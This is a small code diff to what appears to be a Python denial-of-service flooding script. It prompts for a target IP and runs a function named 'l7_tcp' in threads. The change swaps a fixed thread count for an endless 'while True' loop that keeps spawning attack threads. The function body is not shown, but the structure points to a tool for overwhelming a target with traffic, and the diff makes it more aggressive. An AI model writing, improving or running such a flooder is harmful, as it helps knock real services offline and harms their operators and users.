@@ -2,7 +2,6 @@ import threading
 import requests
 
 ip = input("IP: ")
-threads = int(input("Threads: "))
 
 
 def l7_tcp():
@@ -15,8 +14,6 @@ def l7_tcp():
         print("\033[31m[-]\033[0m", err)
 
 
-for i in range(threads):
+while True:
     t = threading.Thread(target=l7_tcp)
     t.start()
-
-input("")
